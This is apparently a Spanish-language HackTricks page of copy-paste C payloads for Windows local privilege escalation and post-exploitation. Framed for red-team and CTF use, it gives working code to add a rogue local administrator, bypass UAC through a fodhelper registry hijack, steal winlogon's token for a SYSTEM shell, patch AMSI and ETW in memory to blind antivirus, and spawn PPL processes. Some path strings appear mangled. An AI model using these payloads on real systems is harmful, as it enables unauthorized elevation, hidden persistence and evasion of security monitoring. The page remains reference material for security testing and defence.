# Payloads en C para Windows

{{#include ../../banners/hacktricks-training.md}}

Esta página recopila **pequeños fragmentos de código en C autocontenidos** que son útiles durante escalada de privilegios local en Windows o post-explotación. Cada payload está diseñado para ser **fácil de copiar y pegar**, requiere únicamente la API de Windows / tiempo de ejecución de C y puede compilarse con `i686-w64-mingw32-gcc` (x86) o `x86_64-w64-mingw32-gcc` (x64).

> ⚠️ Estos payloads asumen que el proceso ya tiene los privilegios mínimos necesarios para realizar la acción (p. ej. `SeDebugPrivilege`, `SeImpersonatePrivilege`, o un contexto de integridad media para un UAC bypass). Están destinados a entornos de **red-team o CTF** donde explotar una vulnerabilidad ha producido ejecución de código nativo arbitrario.

---

## Agregar usuario administrador local
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Cuando el binario confiable **`fodhelper.exe`** se ejecuta, consulta la ruta del Registro que aparece abajo **sin filtrar el verbo `DelegateExecute`**. Al plantar nuestro comando bajo esa clave, un atacante puede eludir UAC *sin* dejar un archivo en disco.

*Ruta del Registro consultada por `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Un PoC mínimo que abre un `cmd.exe` elevado:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Probado en Windows 10 22H2 y Windows 11 23H2 (parches de julio de 2025). El bypass sigue funcionando porque Microsoft no ha corregido la falta de verificación de integridad en la ruta `DelegateExecute`.*

---

## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Si el proceso actual posee **ambos** privilegios `SeDebug` y `SeImpersonate` (típico en muchas cuentas de servicio), puedes robar el token de `winlogon.exe`, duplicarlo e iniciar un proceso elevado:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Para una explicación más detallada de cómo funciona, consulte:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
La mayoría de los motores AV/EDR modernos dependen de **AMSI** y **ETW** para inspeccionar comportamientos maliciosos. Parchear ambas interfaces tempranamente dentro del proceso actual evita que los payloads basados en scripts (p. ej., PowerShell, JScript) sean escaneados.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*El parche anterior es local al proceso; iniciar un nuevo PowerShell después de ejecutarlo se ejecutará sin inspección AMSI/ETW.*

---

## Crear proceso hijo como Protected Process Light (PPL)
Solicita un nivel de protección PPL para un proceso hijo en el momento de creación usando `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Esta es una API documentada y solo tendrá éxito si la imagen objetivo está firmada para la clase de firmante solicitada (Windows/WindowsLight/Antimalware/LSA/WinTcb).
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Niveles usados con más frecuencia:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Valida el resultado con Process Explorer/Process Hacker comprobando la columna Protection.

---

## Referencias
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – lanzador de procesos PPL mínimo: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute

{{#include ../../banners/hacktricks-training.md}}
